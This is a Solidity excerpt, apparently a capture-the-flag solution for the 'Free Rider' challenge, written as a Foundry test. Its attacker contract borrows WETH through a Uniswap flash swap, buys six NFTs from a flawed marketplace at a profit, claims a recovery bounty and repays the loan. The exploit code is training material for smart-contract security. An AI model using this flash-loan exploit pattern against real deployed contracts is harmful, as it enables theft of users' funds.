...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        new FreeRiderAttacker(uniswapPair, marketplace, recoveryManager).attack();
    }
...
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    ...
    constructor (IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recoveryManager) {
        pair = _pair;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        weth = WETH(payable(pair.token0()));
        nft = marketplace.token();
    }

    function attack() external {
        pair.swap(price, 0, address(this), hex"deadbeef");
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        require(weth.balanceOf(address(this)) == price);
        weth.withdraw(price);
        ...
        require(address(this).balance == price * 6);
        for (uint256 i = 0; i < 6; i++) {
            require(nft.ownerOf(i) == address(this));
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
        }
        require(address(this).balance == price * 9); // + 45 ETH bounty

        uint256 swapReturn = price * 1000 / 997 + 1;
        weth.deposit{value: swapReturn}();
        weth.transfer(address(pair), swapReturn);
    }
